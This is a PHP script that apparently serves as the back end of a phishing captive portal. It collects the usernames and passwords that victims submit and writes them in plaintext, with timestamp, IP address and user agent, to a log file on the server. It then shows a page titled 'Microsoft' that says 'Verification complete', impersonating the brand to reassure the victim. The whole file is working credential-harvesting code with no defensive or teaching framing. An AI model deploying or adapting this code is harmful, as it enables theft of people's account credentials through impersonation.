
<?php
function norm_ip($ip) {
  if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4)) {
    $p = explode('.', $ip); $p[3] = '0'; return implode('.', $p);
  }
  if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_IPV6)) {
    return preg_replace('/:[0-9a-fA-F]{0,4}$/', ':0000', $ip);
  }
  return '0.0.0.0';
}

$user = trim($_POST['user'] ?? '');
$pwd  = trim($_POST['password'] ?? '');
if ($user === '' || $pwd === '') { http_response_code(400); exit; }

$ip   = norm_ip($_SERVER['REMOTE_ADDR'] ?? '0.0.0.0');
$ua   = substr($_SERVER['HTTP_USER_AGENT'] ?? '-', 0, 180);
$when = gmdate('c');

$line = json_encode([
  '| Time: '    => $when,
  '| IP Address: '    => $ip,
  '| User-Agent: '    => $ua,
  '| Credentials: ' => ['user' => $user, 'password' => $pwd]
], JSON_UNESCAPED_UNICODE) . PHP_EOL;

$primary = '/var/log/ca.log';
$fallbackDir  = __DIR__ . '/logs';
$fallbackFile = $fallbackDir . '/ca.log';
if (!is_dir($fallbackDir)) { @mkdir($fallbackDir, 0700, true); }

$ok = false;
if (@is_writable($primary) || (!file_exists($primary) && @is_writable(dirname($primary)))) {
  if ($fh = @fopen($primary, 'ab')) { @fwrite($fh, $line); @fclose($fh); $ok = true; }
}
if (!$ok) {
  if ($fh2 = @fopen($fallbackFile, 'ab')) { @fwrite($fh2, $line); @fclose($fh2); $ok = true; }
}
if (!$ok) { error_log("fuck"); http_response_code(500); exit; }

error_log("captive-portal: $line");

?>
<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Microsoft</title>
<style>
  body{margin:0;display:grid;place-items:center;height:100vh;font-family:Segoe UI, Arial, sans-serif;background:#f3f6fb}
  .box{background:#fff;padding:24px 28px;border-radius:8px;box-shadow:0 2px 14px rgba(0,0,0,.12);max-width:420px}
  h1{font-size:22px;margin:0 0 10px}
  p{margin:0;color:#333}
  a{color:#0067b8;text-decoration:none}
  a:hover{text-decoration:underline}
</style>
</head>
<body>
  <div class="box">
    <h1>Verification complete</h1>
    <p>You may now close this window.</p>
    <p><a href="index.html">Back</a></p>
  </div>
</body>
</html>




